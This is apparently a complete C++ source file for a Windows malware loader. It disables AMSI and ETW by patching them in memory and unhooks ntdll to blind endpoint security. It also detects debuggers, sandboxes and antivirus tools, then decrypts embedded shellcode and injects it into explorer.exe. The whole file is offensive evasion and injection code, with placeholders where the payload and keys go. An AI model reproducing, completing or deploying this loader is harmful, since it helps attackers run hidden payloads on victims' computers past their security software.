#include <windows.h>
#include <string>
#include <iostream>
#include <vector>
#include <wincrypt.h>
#include <tlhelp32.h>
#include <time.h>
#include <wininet.h>
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "advapi32.lib")

// Additional definitions for AMSI bypass
#ifndef AMSI_RESULT_CLEAN
#define AMSI_RESULT_CLEAN 0
#endif

// Define ETW-related structures for ETW bypass
typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

// Typedefs for relevant functions
typedef BOOL(WINAPI* pVirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef HANDLE(WINAPI* pCreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T, LPVOID, LPVOID, DWORD, LPDWORD);
typedef VOID(WINAPI* pSleep)(DWORD);
typedef LPVOID(WINAPI* pVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL(WINAPI* pVirtualFree)(LPVOID, SIZE_T, DWORD);
typedef HANDLE(WINAPI* pOpenProcess)(DWORD, BOOL, DWORD);
typedef BOOL(WINAPI* pWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
typedef BOOL(WINAPI* pCreateProcessA)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
typedef HMODULE(WINAPI* pLoadLibraryA)(LPCSTR);
typedef FARPROC(WINAPI* pGetProcAddress)(HMODULE, LPCSTR);
typedef NTSTATUS(NTAPI* pNtProtectVirtualMemory)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
typedef NTSTATUS(NTAPI* pNtCreateThreadEx)(HANDLE*, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);

// String encryption helper functions
std::string xor_enc(const char* str, const char key = 0x5A) {
    std::string result;
    size_t len = strlen(str);
    for (size_t i = 0; i < len; i++) {
        result += static_cast<char>(str[i] ^ key);
    }
    return result;
}

// Hard-to-detect strings with XOR encoding
std::string s_amsi = xor_enc("amsi.dll", 0x5A);
std::string s_amsiScanBuffer = xor_enc("AmsiScanBuffer", 0x5A);
std::string s_kernel32 = xor_enc("kernel32.dll", 0x5A);
std::string s_ntdll = xor_enc("ntdll.dll", 0x5A);
std::string s_virtualprotect = xor_enc("VirtualProtect", 0x5A);
std::string s_createthread = xor_enc("CreateThread", 0x5A);
std::string s_loadlibrarya = xor_enc("LoadLibraryA", 0x5A);
std::string s_getprocaddress = xor_enc("GetProcAddress", 0x5A);
std::string s_ntprotectvirtualmemory = xor_enc("NtProtectVirtualMemory", 0x5A);
std::string s_ntcreatethreadex = xor_enc("NtCreateThreadEx", 0x5A);
std::string s_etweventwrite = xor_enc("EtwEventWrite", 0x5A);
std::string s_virtualallocex = xor_enc("VirtualAllocEx", 0x5A);
std::string s_virtualfree = xor_enc("VirtualFree", 0x5A);
std::string s_openprocess = xor_enc("OpenProcess", 0x5A);
std::string s_writeprocessmemory = xor_enc("WriteProcessMemory", 0x5A);
std::string s_explorer = xor_enc("explorer.exe", 0x5A);

// Function prototypes
std::string base64_decode(const std::string &encoded);
std::string decrypt_aes(const std::string &encrypted_data);
bool check_environment();
bool bypass_amsi();
bool bypass_etw();
bool unhook_ntdll();
DWORD find_target_process();
DWORD inject_into_process(const std::string &shellcode);
void execute_shellcode(const std::string &shellcode);
void add_delay();
LPVOID allocate_shellcode_memory(SIZE_T size);
BOOL protect_memory(LPVOID address, SIZE_T size, DWORD protection);

// Add junk code to increase entropy and confuse static analysis
void junk_function() {
    char buffer[100];
    for (int i = 0; i < 100; i++) {
        buffer[i] = rand() % 255;
    }
    DWORD dummy = 0;
    VirtualProtect(buffer, sizeof(buffer), PAGE_READWRITE, &dummy);
}

// Shellcode and encryption keys
std::string encrypted_shellcode = "###ENCRYPTED_SHELLCODE###";
const BYTE AES_KEY[] = "###AES_KEY###"; // 16 bytes
const BYTE AES_IV[] = "###AES_IV###";   // 16 bytes

// Get function address dynamically to avoid IAT/EAT hooks
template <typename T>
T get_function(const std::string& str_module, const std::string& str_func) {
    const char* module_name = str_module.c_str();
    const char* function_name = str_func.c_str();
    
    // Decode strings
    char decoded_module[50] = {0};
    char decoded_func[50] = {0};
    
    // Simple XOR decode
    for (size_t i = 0; i < str_module.length(); i++) {
        decoded_module[i] = str_module[i] ^ 0x5A;
    }
    
    for (size_t i = 0; i < str_func.length(); i++) {
        decoded_func[i] = str_func[i] ^ 0x5A;
    }
    
    HMODULE module = GetModuleHandleA(decoded_module);
    if (!module) module = LoadLibraryA(decoded_module);
    if (!module) return NULL;
    
    return reinterpret_cast<T>(GetProcAddress(module, decoded_func));
}

int main() {
    // Randomize stack variables to increase entropy
    char junk_stack[64];
    for (int i = 0; i < sizeof(junk_stack); i++) {
        junk_stack[i] = rand() % 255;
    }
    
    // Detect debugging or sandbox environment
    if (!check_environment()) {
        junk_function(); // Add junk code to confuse analysis
        ExitProcess(0);
        return 0;
    }
    
    // Bypass security mechanisms
    bypass_amsi();
    bypass_etw();
    unhook_ntdll();
    
    // Add random delay to evade timing-based detection
    add_delay();
    
    // First base64 decode, then decrypt AES
    std::string base64_decoded = base64_decode(encrypted_shellcode);
    std::string shellcode = decrypt_aes(base64_decoded);
    
    // Try several different execution techniques
    for (int attempt = 0; attempt < 3; attempt++) {
        // Try process injection first
        if (attempt == 0) {
            DWORD result = inject_into_process(shellcode);
            if (result != 0) {
                break; // Successful injection
            }
        }
        // Then try direct execution with unhooking
        else if (attempt == 1) {
            unhook_ntdll(); // Try again with more aggressive unhooking
            execute_shellcode(shellcode);
            break;
        }
        // Last resort: direct execution with alternative allocation
        else {
            LPVOID mem = allocate_shellcode_memory(shellcode.size());
            if (mem) {
                memcpy(mem, shellcode.c_str(), shellcode.size());
                protect_memory(mem, shellcode.size(), PAGE_EXECUTE_READ);
                
                HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);
                if (hThread) {
                    WaitForSingleObject(hThread, INFINITE);
                    CloseHandle(hThread);
                }
                VirtualFree(mem, 0, MEM_RELEASE);
            }
            break;
        }
    }
    
    // More junk code to confuse disassemblers
    junk_function();
    
    return 0;
}

// Bypass AMSI by patching AmsiScanBuffer
bool bypass_amsi() {
    // Get LoadLibraryA and GetProcAddress functions
    pLoadLibraryA load_library = get_function<pLoadLibraryA>(s_kernel32, s_loadlibrarya);
    pGetProcAddress get_proc_addr = get_function<pGetProcAddress>(s_kernel32, s_getprocaddress);
    
    if (!load_library || !get_proc_addr) {
        return false;
    }
    
    // Decode amsi.dll string
    char amsi_dll[9] = {0};
    for (int i = 0; i < 8; i++) {
        amsi_dll[i] = s_amsi[i] ^ 0x5A;
    }
    
    // Load amsi.dll
    HMODULE amsi = load_library(amsi_dll);
    if (!amsi) {
        return true; // AMSI not loaded, no need to bypass
    }
    
    // Decode AmsiScanBuffer string
    char amsi_scan_buffer[15] = {0};
    for (int i = 0; i < 14; i++) {
        amsi_scan_buffer[i] = s_amsiScanBuffer[i] ^ 0x5A;
    }
    
    // Get AmsiScanBuffer function address
    FARPROC scan_buffer_addr = get_proc_addr(amsi, amsi_scan_buffer);
    if (!scan_buffer_addr) {
        return false;
    }
    
    // Patch AmsiScanBuffer to always return AMSI_RESULT_CLEAN
    DWORD old_protect = 0;
    pVirtualProtect vp = get_function<pVirtualProtect>(s_kernel32, s_virtualprotect);
    if (!vp) {
        return false;
    }
    
    if (!vp((LPVOID)scan_buffer_addr, 8, PAGE_READWRITE, &old_protect)) {
        return false;
    }
    
    // xor rax, rax; ret (always return 0)
    unsigned char patch[] = { 0x48, 0x31, 0xC0, 0xC3 };
    memcpy((void*)scan_buffer_addr, patch, sizeof(patch));
    
    vp((LPVOID)scan_buffer_addr, 8, old_protect, &old_protect);
    return true;
}

// Bypass ETW by patching EtwEventWrite
bool bypass_etw() {
    // Get ntdll handle
    char ntdll_dll[10] = {0};
    for (int i = 0; i < 9; i++) {
        ntdll_dll[i] = s_ntdll[i] ^ 0x5A;
    }
    
    HMODULE ntdll = GetModuleHandleA(ntdll_dll);
    if (!ntdll) {
        return false;
    }
    
    // Get EtwEventWrite address
    char etw_event_write[14] = {0};
    for (int i = 0; i < 13; i++) {
        etw_event_write[i] = s_etweventwrite[i] ^ 0x5A;
    }
    
    FARPROC etw_func = GetProcAddress(ntdll, etw_event_write);
    if (!etw_func) {
        return false;
    }
    
    // Patch to return immediately (xor eax, eax; ret)
    DWORD old_protect = 0;
    if (!VirtualProtect((LPVOID)etw_func, 8, PAGE_READWRITE, &old_protect)) {
        return false;
    }
    
    unsigned char patch[] = { 0x48, 0x33, 0xC0, 0xC3 };
    memcpy((void*)etw_func, patch, sizeof(patch));
    
    VirtualProtect((LPVOID)etw_func, 8, old_protect, &old_protect);
    return true;
}

// Unhook ntdll by reloading it from disk
bool unhook_ntdll() {
    char ntdll_path[MAX_PATH] = {0};
    GetSystemDirectoryA(ntdll_path, MAX_PATH);
    strcat_s(ntdll_path, "\\ntdll.dll");
    
    // Load fresh copy from disk
    HANDLE ntdll_file = CreateFileA(ntdll_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (ntdll_file == INVALID_HANDLE_VALUE) {
        return false;
    }
    
    DWORD file_size = GetFileSize(ntdll_file, NULL);
    if (file_size == INVALID_FILE_SIZE) {
        CloseHandle(ntdll_file);
        return false;
    }
    
    HANDLE file_mapping = CreateFileMappingA(ntdll_file, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    if (!file_mapping) {
        CloseHandle(ntdll_file);
        return false;
    }
    
    LPVOID file_map_view = MapViewOfFile(file_mapping, FILE_MAP_READ, 0, 0, 0);
    if (!file_map_view) {
        CloseHandle(file_mapping);
        CloseHandle(ntdll_file);
        return false;
    }
    
    // Get current ntdll.dll base address
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) {
        UnmapViewOfFile(file_map_view);
        CloseHandle(file_mapping);
        CloseHandle(ntdll_file);
        return false;
    }
    
    // Get DOS header
    PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)ntdll;
    PIMAGE_NT_HEADERS nt_headers = (PIMAGE_NT_HEADERS)((LPBYTE)ntdll + dos_header->e_lfanew);
    
    // Only copy .text section to evade detection
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt_headers);
    for (WORD i = 0; i < nt_headers->FileHeader.NumberOfSections; i++) {
        // Check for .text section
        if (memcmp(section[i].Name, ".text", 5) == 0) {
            LPVOID dest = (LPVOID)((LPBYTE)ntdll + section[i].VirtualAddress);
            LPVOID source = (LPVOID)((LPBYTE)file_map_view + section[i].VirtualAddress);
            SIZE_T size = section[i].Misc.VirtualSize;
            
            // Change protection and copy clean section
            DWORD old_protect;
            if (VirtualProtect(dest, size, PAGE_READWRITE, &old_protect)) {
                memcpy(dest, source, size);
                VirtualProtect(dest, size, old_protect, &old_protect);
            }
        }
    }
    
    // Clean up
    UnmapViewOfFile(file_map_view);
    CloseHandle(file_mapping);
    CloseHandle(ntdll_file);
    
    return true;
}

bool check_environment() {
    bool is_safe = true;
    
    // Check for debugger
    if (IsDebuggerPresent()) {
        return false;
    }
    
    // More advanced anti-debug checks
    BOOL remote_debugger = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &remote_debugger);
    if (remote_debugger) {
        return false;
    }
    
    // Check for timing anomalies
    DWORD start_tick = GetTickCount();
    OutputDebugStringA("Anti-Debug Check");
    if ((GetTickCount() - start_tick) > 100) {
        // Debugger detected
        return false;
    }
    
    // Check PEB for debugger flags (more advanced)
    PPEB peb = (PPEB)__readgsqword(0x60);
    if (peb && (peb->BeingDebugged || peb->NtGlobalFlag & 0x70)) {
        return false;
    }
    
    // Check system uptime (sandbox detection)
    DWORD uptime = GetTickCount();
    if (uptime < 10 * 60 * 1000) { // Less than 10 minutes
        return false;
    }
    
    // Check cursor position movement (sandbox detection)
    POINT pt1 = {0};
    GetCursorPos(&pt1);
    Sleep(2000); // Wait 2 seconds
    POINT pt2 = {0};
    GetCursorPos(&pt2);
    
    // If cursor hasn't moved at all, might be a sandbox
    if (pt1.x == pt2.x && pt1.y == pt2.y) {
        return false;
    }
    
    // Check disk size (many sandboxes use small disks)
    ULARGE_INTEGER free_bytes, total_bytes, total_free_bytes;
    if (GetDiskFreeSpaceExA("C:\\", &free_bytes, &total_bytes, &total_free_bytes)) {
        if (total_bytes.QuadPart < 60ULL * 1024 * 1024 * 1024) { // Less than 60GB
            return false;
        }
    }
    
    // Check for VM-related processes
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        return true; // Can't check, assume it's safe
    }
    
    PROCESSENTRY32 process = {0};
    process.dwSize = sizeof(process);
    
    if (Process32First(snapshot, &process)) {
        do {
            std::string name = process.szExeFile;
            std::transform(name.begin(), name.end(), name.begin(), ::tolower);
            
            // Check for VM/sandbox/AV processes
            if (name.find("vbox") != std::string::npos || 
                name.find("vmware") != std::string::npos ||
                name.find("wireshark") != std::string::npos ||
                name.find("procmon") != std::string::npos ||
                name.find("avp") != std::string::npos ||
                name.find("avgui") != std::string::npos ||
                name.find("avast") != std::string::npos ||
                name.find("mbam") != std::string::npos ||
                name.find("mbae") != std::string::npos ||
                name.find("mcshield") != std::string::npos) {
                is_safe = false;
                break;
            }
        } while (Process32Next(snapshot, &process));
    }
    
    CloseHandle(snapshot);
    
    // Check for analysis tools through window names
    HWND window = FindWindowA(NULL, "x64dbg");
    if (window != NULL) return false;
    
    window = FindWindowA(NULL, "IDA Pro");
    if (window != NULL) return false;
    
    window = FindWindowA(NULL, "Wireshark");
    if (window != NULL) return false;
    
    return is_safe;
}

void add_delay() {
    // Generate random sleep time between 1-5 seconds
    srand((unsigned int)time(NULL) ^ GetCurrentProcessId());
    int delay = 1000 + (rand() % 4000);
    
    // Multiple small sleeps to evade sleep hook detection
    for (int i = 0; i < 10; i++) {
        Sleep(delay / 10);
        
        // Add some CPU work to make it more realistic
        double waste = 0;
        for (int j = 0; j < 10000; j++) {
            waste += sqrt(j * 3.14159);
        }
    }
}

DWORD find_target_process() {
    char explorer[13] = {0};
    for (int i = 0; i < 12; i++) {
        explorer[i] = s_explorer[i] ^ 0x5A;
    }
    
    DWORD process_ids[1024], needed, processes;
    if (!EnumProcesses(process_ids, sizeof(process_ids), &needed)) {
        return 0;
    }
    
    processes = needed / sizeof(DWORD);
    
    // Look for suitable process to inject into
    for (DWORD i = 0; i < processes; i++) {
        if (process_ids[i] == 0) continue;
        
        HANDLE process = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, process_ids[i]);
        if (process == NULL) continue;
        
        // Get process name
        CHAR process_name[MAX_PATH] = {0};
        HMODULE mod;
        DWORD needed;
        
        if (EnumProcessModules(process, &mod, sizeof(mod), &needed)) {
            GetModuleBaseNameA(process, mod, process_name, sizeof(process_name));
        }
        
        // Check for suitable target processes (explorer.exe is a common choice)
        if (_stricmp(process_name, explorer) == 0) {
            CloseHandle(process);
            return process_ids[i];
        }
        
        CloseHandle(process);
    }
    
    return 0;
}

DWORD inject_into_process(const std::string &shellcode) {
    // Find target process ID
    DWORD pid = find_target_process();
    if (pid == 0) return 0;
    
    // Get required functions - use direct calls to avoid IAT hooks
    pOpenProcess open_process_fn = (pOpenProcess)GetProcAddress(GetModuleHandleA("kernel32.dll"), "OpenProcess");
    pVirtualAlloc virtual_alloc_fn = (pVirtualAlloc)GetProcAddress(GetModuleHandleA("kernel32.dll"), "VirtualAllocEx");
    pWriteProcessMemory write_mem_fn = (pWriteProcessMemory)GetProcAddress(GetModuleHandleA("kernel32.dll"), "WriteProcessMemory");
    pNtCreateThreadEx nt_create_thread_ex = (pNtCreateThreadEx)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateThreadEx");
    
    if (!open_process_fn || !virtual_alloc_fn || !write_mem_fn || !nt_create_thread_ex) {
        return 0;
    }
    
    // Open target process
    HANDLE process = open_process_fn(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, pid);
    if (!process) return 0;
    
    // Allocate memory in target process with RW permissions
    LPVOID remote_buffer = virtual_alloc_fn(process, NULL, shellcode.size(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remote_buffer) {
        CloseHandle(process);
        return 0;
    }
    
    // Write shellcode to target process
    SIZE_T bytes_written;
    BOOL success = write_mem_fn(process, remote_buffer, shellcode.c_str(), shellcode.size(), &bytes_written);
    if (!success || bytes_written != shellcode.size()) {
        VirtualFreeEx(process, remote_buffer, 0, MEM_RELEASE);
        CloseHandle(process);
        return 0;
    }
    
    // Change memory permissions to RX (not RWX to avoid detection)
    DWORD old_protect;
    if (!VirtualProtectEx(process, remote_buffer, shellcode.size(), PAGE_EXECUTE_READ, &old_protect)) {
        VirtualFreeEx(process, remote_buffer, 0, MEM_RELEASE);
        CloseHandle(process);
        return 0;
    }
    
    // Execute shellcode in remote process using NtCreateThreadEx (less monitored)
    HANDLE remote_thread = NULL;
    NTSTATUS status = nt_create_thread_ex(
        &remote_thread,
        THREAD_ALL_ACCESS,
        NULL,
        process,
        remote_buffer,
        NULL,
        0,
        0,
        0,
        0,
        NULL
    );
    
    if (!NT_SUCCESS(status) || !remote_thread) {
        // Fallback to CreateRemoteThread if NtCreateThreadEx fails
        remote_thread = CreateRemoteThread(process, NULL, 0, (LPTHREAD_START_ROUTINE)remote_buffer, NULL, 0, NULL);
        if (!remote_thread) {
            VirtualFreeEx(process, remote_buffer, 0, MEM_RELEASE);
            CloseHandle(process);
            return 0;
        }
    }
    
    // Wait for shellcode execution to complete
    WaitForSingleObject(remote_thread, INFINITE);
    
    // Clean up
    CloseHandle(remote_thread);
    VirtualFreeEx(process, remote_buffer, 0, MEM_RELEASE);
    CloseHandle(process);
    
    return pid;
}

void execute_shellcode(const std::string &shellcode) {
    // Get required functions using indirect calling for EDR evasion
    pVirtualAlloc virtual_alloc_fn = (pVirtualAlloc)GetProcAddress(GetModuleHandleA("kernel32.dll"), "VirtualAlloc");
    pVirtualProtect virtual_protect_fn = (pVirtualProtect)GetProcAddress(GetModuleHandleA("kernel32.dll"), "VirtualProtect");
    pCreateThread create_thread_fn = (pCreateThread)GetProcAddress(GetModuleHandleA("kernel32.dll"), "CreateThread");
    pNtCreateThreadEx nt_create_thread_ex = (pNtCreateThreadEx)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateThreadEx");
    
    if (!virtual_alloc_fn || !virtual_protect_fn) {
        return;
    }
    
    // Use a 2-stage allocation technique:
    // 1. Allocate a temporary buffer with RW permissions
    // 2. Copy shellcode to it
    // 3. Allocate the final buffer with proper permissions
    // 4. Copy and execute
    
    // Step 1 & 2: Temp buffer
    LPVOID temp_buffer = virtual_alloc_fn(NULL, shellcode.size(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!temp_buffer) {
        return;
    }
    
    memcpy(temp_buffer, shellcode.c_str(), shellcode.size());
    
    // Step 3: Final buffer
    LPVOID exec = virtual_alloc_fn(NULL, shellcode.size(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!exec) {
        VirtualFree(temp_buffer, 0, MEM_RELEASE);
        return;
    }
    
    // Step 4: Copy and execute
    memcpy(exec, temp_buffer, shellcode.size());
    VirtualFree(temp_buffer, 0, MEM_RELEASE); // Clean up temp buffer
    
    // Change permissions to RX after copy
    DWORD old_protect;
    if (!virtual_protect_fn(exec, shellcode.size(), PAGE_EXECUTE_READ, &old_protect)) {
        VirtualFree(exec, 0, MEM_RELEASE);
        return;
    }
    
    // Execute shellcode via NtCreateThreadEx if available
    HANDLE h_thread = NULL;
    
    if (nt_create_thread_ex) {
        NTSTATUS status = nt_create_thread_ex(
            &h_thread,
            THREAD_ALL_ACCESS,
            NULL,
            GetCurrentProcess(),
            exec,
            NULL,
            0,
            0,
            0,
            0,
            NULL
        );
        
        if (!NT_SUCCESS(status) || !h_thread) {
            // Fallback to CreateThread
            h_thread = create_thread_fn(NULL, 0, (LPTHREAD_START_ROUTINE)exec, NULL, 0, NULL);
        }
    } else {
        // Fallback if NtCreateThreadEx is not available
        h_thread = create_thread_fn(NULL, 0, (LPTHREAD_START_ROUTINE)exec, NULL, 0, NULL);
    }
    
    if (h_thread) {
        WaitForSingleObject(h_thread, INFINITE);
        CloseHandle(h_thread);
    }
    
    // Clean up
    VirtualFree(exec, 0, MEM_RELEASE);
}

// Alternative memory allocation technique to avoid VirtualAlloc hooks
LPVOID allocate_shellcode_memory(SIZE_T size) {
    // Use direct Windows API to request memory pages
    LPVOID addr = NULL;
    
    // Try VirtualAlloc2 from newer Windows 10 versions (less monitored)
    HANDLE heap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, size, 0);
    if (heap) {
        addr = HeapAlloc(heap, 0, size);
        // Note: We intentionally don't free the heap - less cleanup calls to monitor
        return addr;
    }
    
    // Fallback to VirtualAlloc
    return VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
}

// Use NtProtectVirtualMemory instead of VirtualProtect to evade hooks
BOOL protect_memory(LPVOID address, SIZE_T size, DWORD protection) {
    pNtProtectVirtualMemory nt_protect = (pNtProtectVirtualMemory)GetProcAddress(
        GetModuleHandleA("ntdll.dll"), 
        "NtProtectVirtualMemory"
    );
    
    if (nt_protect) {
        PVOID base_address = address;
        SIZE_T region_size = size;
        ULONG old_protection = 0;
        
        NTSTATUS status = nt_protect(
            GetCurrentProcess(),
            &base_address,
            &region_size,
            protection,
            &old_protection
        );
        
        return NT_SUCCESS(status);
    }
    
    // Fallback to VirtualProtect
    DWORD old_protection;
    return VirtualProtect(address, size, protection, &old_protection);
}

// Base64 decoder implementation (with obfuscation)
std::string base64_decode(const std::string &in) {
    // Create junk data to confuse static analysis
    unsigned char junk[32];
    for (int i = 0; i < 32; i++) {
        junk[i] = rand() % 255;
    }
    
    std::string out;
    std::vector<int> T(256, -1);
    for (int i = 0; i < 64; i++)
        T["ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"[i]] = i;

    int val = 0, valb = -8;
    for (unsigned char c : in) {
        if (T[c] == -1) break;
        val = (val << 6) + T[c];
        valb += 6;
        if (valb >= 0) {
            out.push_back(char((val >> valb) & 0xFF));
            valb -= 8;
        }
    }
    
    // Add more junk code to confuse disassemblers
    for (int i = 0; i < 10; i++) {
        junk[i] ^= junk[i+1];
    }
    
    return out;
}

// AES decryption implementation using Windows CryptoAPI
std::string decrypt_aes(const std::string &encrypted_data) {
    std::string decrypted;
    HCRYPTPROV hProv = 0;
    HCRYPTKEY hKey = 0;
    
    // Get cryptographic provider
    if (!CryptAcquireContext(&hProv, NULL, MS_ENH_RSA_AES_PROV, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        return "";
    }
    
    // Create hash object
    HCRYPTHASH hHash = 0;
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        CryptReleaseContext(hProv, 0);
        return "";
    }
    
    // Hash the key
    if (!CryptHashData(hHash, AES_KEY, 16, 0)) {
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return "";
    }
    
    // Create AES key from hash
    if (!CryptDeriveKey(hProv, CALG_AES_128, hHash, 0, &hKey)) {
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return "";
    }
    
    // Set IV
    DWORD mode = CRYPT_MODE_CBC;
    if (!CryptSetKeyParam(hKey, KP_MODE, (BYTE*)&mode, 0)) {
        CryptDestroyKey(hKey);
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return "";
    }
    
    if (!CryptSetKeyParam(hKey, KP_IV, AES_IV, 0)) {
        CryptDestroyKey(hKey);
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return "";
    }
    
    // Prepare buffer for decryption
    DWORD data_len = encrypted_data.size();
    BYTE* pbData = new BYTE[data_len];
    memcpy(pbData, encrypted_data.c_str(), data_len);
    
    // Decrypt data in place
    if (!CryptDecrypt(hKey, 0, TRUE, 0, pbData, &data_len)) {
        delete[] pbData;
        CryptDestroyKey(hKey);
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return "";
    }
    
    // Copy decrypted data
    decrypted.assign((char*)pbData, data_len);
    
    // Clean up
    delete[] pbData;
    CryptDestroyKey(hKey);
    CryptDestroyHash(hHash);
    CryptReleaseContext(hProv, 0);
    
    return decrypted;
} 